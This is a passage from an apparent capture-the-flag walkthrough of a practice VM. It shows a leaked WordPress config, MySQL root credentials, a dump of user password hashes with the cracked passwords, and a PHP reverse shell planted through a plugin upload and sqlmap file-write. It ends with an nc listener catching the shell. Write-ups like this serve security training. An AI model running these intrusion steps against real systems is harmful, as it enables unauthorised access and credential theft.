</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;DB_COLLATE&#39;</span>, <span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/**#@+
</span><span class='line'> * Authentication Unique Keys and Salts.
</span><span class='line'> * Change these to different unique phrases!
</span><span class='line'> * You can generate these using the <span class="o">{</span>@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service<span class="o">}</span>
</span><span class='line'> * You can change these at any point in <span class="nb">time </span>to invalidate all existing cookies. This will force all users to have to log in again.
</span><span class='line'> * @since 2.6.0
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;AUTH_KEY&#39;</span>,         <span class="s1">&#39;V 5p=[.Vds8~SX;&gt;t)++Tt57U6{Xe`T|oW^eQ!mHr }]&gt;9RX07W&lt;sZ,I~`6Y5-T:&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;SECURE_AUTH_KEY&#39;</span>,  <span class="s1">&#39;vJZq=p.Ug,]:&lt;-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&amp;!/#&gt;4#K7eFP5-av`n)2&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;LOGGED_IN_KEY&#39;</span>,    <span class="s1">&#39;ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU&lt;cr.wm?|jqZH:YMv;zu@tM7P:4o&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;NONCE_KEY&#39;</span>,        <span class="s1">&#39;j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;AUTH_SALT&#39;</span>,        <span class="s1">&#39;I{gDlDs`Z@.+/AdyzYw4%+&lt;WsO-LDBHT}&gt;}!||Xrf@1E6jJNV={p1?yMKYec*OI$&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;SECURE_AUTH_SALT&#39;</span>, <span class="s1">&#39;.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*&gt;#z+p&gt;nVi10`XOUq (Zml~op3SG4OG_D&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;LOGGED_IN_SALT&#39;</span>,   <span class="s1">&#39;[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&amp;_nP4{D}n=y=FQt%zJw&gt;c[a+;ppCzIkt;&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;NONCE_SALT&#39;</span>,       <span class="s1">&#39;tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/**#@-*/
</span><span class='line'> * WordPress Database Table prefix.
</span><span class='line'> * You can have multiple installations in one database <span class="k">if</span> you give each a unique
</span><span class='line'> * prefix. Only numbers, letters, and underscores please!
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="s1">&#39;wp_&#39;</span><span class="p">;</span>
</span><span class='line'> * For developers: WordPress debugging mode.
</span><span class='line'> * Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
</span><span class='line'> * It is strongly recommended that plugin and theme developers use WP_DEBUG
</span><span class='line'> * in their development environments.
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;WP_DEBUG&#39;</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/* That<span class="s1">&#39;s all, stop editing! Happy blogging. */</span>
</span><span class='line'><span class="s1">/** Absolute path to the WordPress directory. */</span>
</span><span class='line'><span class="s1">if ( !defined(&#39;</span>ABSPATH<span class="s1">&#39;) )</span>
</span><span class='line'><span class="s1"> define(&#39;</span>ABSPATH<span class="s1">&#39;, dirname(__FILE__) . &#39;</span>/<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">/** Sets up WordPress vars and included files. */</span>
</span><span class='line'><span class="s1">require_once(ABSPATH . &#39;</span>wp-settings.php<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>WP_HTTP_BLOCK_EXTERNAL<span class="err">&#39;</span>, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now I got the MySQL database ROOT login password and the DB name:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DB_USER: root
</span><span class='line'>DB_PASS: plbkac
</span><span class='line'>DB_NAME: wordpress
</span></code></pre></td></tr></table></div></figure>


<p>When exploiting the Local File Inclusion vulnerability, I found the full path disclosure as well when a non-exist file name is given.</p>

<p>The full path is <font color="red"><code>/var/www/https/blogblog/</code></font></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/stapler/3.png"></p>

<p>Due to obtain the MySQL root and password, I was connected to target MySQL server with ROOT priviledge.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# mysql -h 10.1.1.138 -u root -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 8514
</span><span class='line'>Server version: 5.7.13-0ubuntu0.16.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2016, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; show databases<span class="p">;</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="p">|</span> Database           <span class="p">|</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="p">|</span> information_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> loot               <span class="p">|</span>
</span><span class='line'><span class="p">|</span> mysql              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> performance_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> phpmyadmin         <span class="p">|</span>
</span><span class='line'><span class="p">|</span> proof              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> sys                <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wordpress          <span class="p">|</span>
</span><span class='line'>+--------------------+
</span><span class='line'><span class="m">8</span> rows in <span class="nb">set</span> <span class="o">(</span>0.02 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; use wordpress<span class="p">;</span>
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+-----------------------+
</span><span class='line'><span class="p">|</span> Tables_in_wordpress   <span class="p">|</span>
</span><span class='line'>+-----------------------+
</span><span class='line'><span class="p">|</span> wp_commentmeta        <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_comments           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_links              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_options            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_postmeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_posts              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_relationships <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_taxonomy      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_terms              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_usermeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_users              <span class="p">|</span>
</span><span class='line'>+-----------------------+
</span><span class='line'><span class="m">11</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span><span class='line'>mysql&gt; <span class="k">select</span> * from wp_users<span class="p">;</span>
</span><span class='line'>+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
</span><span class='line'><span class="p">|</span> ID <span class="p">|</span> user_login <span class="p">|</span> user_pass                          <span class="p">|</span> user_nicename <span class="p">|</span> user_email            <span class="p">|</span> user_url         <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key <span class="p">|</span> user_status <span class="p">|</span> display_name    <span class="p">|</span>
</span><span class='line'>+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
</span><span class='line'><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> John       <span class="p">|</span> <span class="nv">$P$B7889EMq</span>/erHIuZapMB8GEizebcIy9. <span class="p">|</span> john          <span class="p">|</span> john@red.localhost    <span class="p">|</span> http://localhost <span class="p">|</span> 2016-06-03 23:18:47 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> John Smith      <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Elly       <span class="p">|</span> <span class="nv">$P$BlumbJRRBit7y50Y17</span>.UPJ/xEgv4my0 <span class="p">|</span> elly          <span class="p">|</span> Elly@red.localhost    <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:11:33 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Elly Jones      <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Peter      <span class="p">|</span> <span class="nv">$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0</span> <span class="p">|</span> peter         <span class="p">|</span> peter@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:13:16 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Peter Parker    <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> barry      <span class="p">|</span> <span class="nv">$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0</span> <span class="p">|</span> barry         <span class="p">|</span> barry@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:14:26 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Barry Atkins    <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> heather    <span class="p">|</span> <span class="nv">$P$Bwd0VpK8hX4aN</span>.rZ14WDdhEIGeJgf10 <span class="p">|</span> heather       <span class="p">|</span> heather@red.localhost <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:04 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Heather Neville <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> garry      <span class="p">|</span> <span class="nv">$P$BzjfKAHd6N4cHKiugLX</span>.4aLes8PxnZ1 <span class="p">|</span> garry         <span class="p">|</span> garry@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:23 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> garry           <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> harry      <span class="p">|</span> <span class="nv">$P$BqV</span>.SQ6OtKhVV7k7h1wqESkMh41buR0 <span class="p">|</span> harry         <span class="p">|</span> harry@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:41 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> harry           <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> scott      <span class="p">|</span> <span class="nv">$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1</span> <span class="p">|</span> scott         <span class="p">|</span> scott@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:18:59 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> scott           <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> kathy      <span class="p">|</span> <span class="nv">$P$BZlxAMnC6ON</span>.PYaurLGrhfBi6TjtcA0 <span class="p">|</span> kathy         <span class="p">|</span> kathy@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:19:14 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> kathy           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim        <span class="p">|</span> <span class="nv">$P$BXDR7dLIJczwfuExJdpQqRsNf</span>.9ueN0 <span class="p">|</span> tim           <span class="p">|</span> tim@red.localhost     <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:19:29 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> tim             <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> ZOE        <span class="p">|</span> <span class="nv">$P$B</span>.gMMKRP11QOdT5m1s9mstAUEDjagu1 <span class="p">|</span> zoe           <span class="p">|</span> zoe@red.localhost     <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:19:50 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> ZOE             <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> Dave       <span class="p">|</span> <span class="nv">$P$Bl7</span>/V9Lqvu37jJT.6t4KWmY.v907Hy. <span class="p">|</span> dave          <span class="p">|</span> dave@red.localhost    <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:20:09 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Dave            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">13</span> <span class="p">|</span> Simon      <span class="p">|</span> <span class="nv">$P$BLxdiNNRP008kOQ</span>.jE44CjSK/7tEcz0 <span class="p">|</span> simon         <span class="p">|</span> simon@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:20:35 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Simon           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> Abby       <span class="p">|</span> <span class="nv">$P$ByZg5mTBpKiLZ5KxhhRe</span>/uqR.48ofs. <span class="p">|</span> abby          <span class="p">|</span> abby@red.localhost    <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:20:53 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Abby            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> Vicki      <span class="p">|</span> <span class="nv">$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131</span> <span class="p">|</span> vicki         <span class="p">|</span> vicki@red.localhost   <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:21:14 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Vicki           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="m">16</span> <span class="p">|</span> Pam        <span class="p">|</span> <span class="nv">$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0</span> <span class="p">|</span> pam           <span class="p">|</span> pam@red.localhost     <span class="p">|</span>                  <span class="p">|</span> 2016-06-05 16:42:23 <span class="p">|</span>                     <span class="p">|</span>           <span class="m">0</span> <span class="p">|</span> Pam             <span class="p">|</span>
</span><span class='line'>+----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
</span><span class='line'><span class="m">16</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Then I use <code>john the ripper</code> to crack those hahses and got the following cracked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# john --show 2.txt
</span><span class='line'>John:incorrect
</span><span class='line'>Elly:ylle
</span><span class='line'>barry:washere
</span><span class='line'>heather:passphrase
</span><span class='line'>garry:football
</span><span class='line'>harry:monkey
</span><span class='line'>scott:cookie
</span><span class='line'>kathy:coolgirl
</span><span class='line'>tim:thumb
</span><span class='line'>ZOE:partyqueen
</span><span class='line'>Dave:damachine
</span><span class='line'>Pam:0520
</span><span class='line'>
</span><span class='line'><span class="m">12</span> password hashes cracked, <span class="m">4</span> left
</span></code></pre></td></tr></table></div></figure>


<p>After tried all cracked user/password, I found <code>john</code> has higher priviledge and can be used to upload reverse web shell.</p>

<p>Login to WordPress with john&rsquo;s password, and then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s PHP reverse shell</a>(listen on local port 443) as a plugin.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/stapler/4.png"></p>

<p>After installed the plugin, I went to <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/</code> to check if the file has been uploaded.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/stapler/5.png"></p>

<p>Greet! The web shell file <code>rsh.php</code> has already been uploaded successfully.</p>

<p>In terms to upload web shell, there is another method by using MySQL to write file.</p>

<p>From the previous stage, I got the full path is <font color="red"><code>/var/www/https/blogblog/</code></font> and also the writable directory is <font color="red"><code>/blogblog/wp-content/uploads/</code></font>. And the target MySQL root login password is <font color="red"><code>plbkac</code></font>.</p>

<p>So, now, I should be able to write web shell to target server via MySQL:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# sqlmap -d mysql://root:plbkac@10.1.1.138:3306/wordpress --file-write<span class="o">=</span>rsh.php --file-dest<span class="o">=</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php
</span><span class='line'>         _
</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.5.0#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 23:12:04
</span><span class='line'>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 established
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fingerprinting the back-end DBMS operating system
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;0&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS operating system is Linux
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfile&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfilehex&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfile&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="k">do</span> you want confirmation that the <span class="nb">local </span>file <span class="s1">&#39;rsh.php&#39;</span> has been successfully written on the back-end DBMS file system <span class="o">(</span><span class="s1">&#39;/var/www/https/blogblog/wp-content/uploads/rsh443.php&#39;</span><span class="o">)</span>? <span class="o">[</span>Y/n<span class="o">]</span> Y
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local </span>file <span class="s1">&#39;rsh.php&#39;</span> and the remote file <span class="s1">&#39;/var/www/https/blogblog/wp-content/uploads/rsh443.php&#39;</span> have the same size <span class="o">(</span><span class="m">5495</span> B<span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>_mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="s2">&quot;Unknown table &#39;wordpress.sqlmapfilehex&#39;&quot;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 closed
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure>


<p>Great! looks like the web shell uploaded successfully.</p>

<p>Now got in and time to get ROOT.</p>

<p>Set up <code>nc</code> to listen on local port <code>443</code> and then trigger the shell to connect back by accessing the web shell page on <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/rsh.php</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.138<span class="o">]</span> 37668
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 16:08:13 up <span class="m">1</span> day,  1:59,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


